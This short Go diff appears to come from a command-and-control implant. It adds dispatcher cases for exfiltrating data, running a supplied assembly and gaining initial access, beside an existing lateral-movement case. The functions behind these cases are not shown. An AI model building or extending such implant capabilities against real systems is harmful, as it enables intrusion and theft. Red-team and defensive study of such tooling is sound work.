@@ -306,6 +306,15 @@ func (imp *Implant) executeTask(task protocol.Task) *protocol.TaskResult {
 	case protocol.TaskLateral:
 		output, err = ExecuteLateralMovement(task.Args)
 
+	case protocol.TaskExfil:
+		output, err = ExecuteExfil(task.Args)
+
+	case protocol.TaskAssembly:
+		output, err = ExecuteAssembly(task.Args, task.Data)
+
+	case protocol.TaskInitAccess:
+		output, err = ExecuteInitAccess(task.Args)
+
 	default:
 		err = errMissingArgs("unknown task type")
 	}
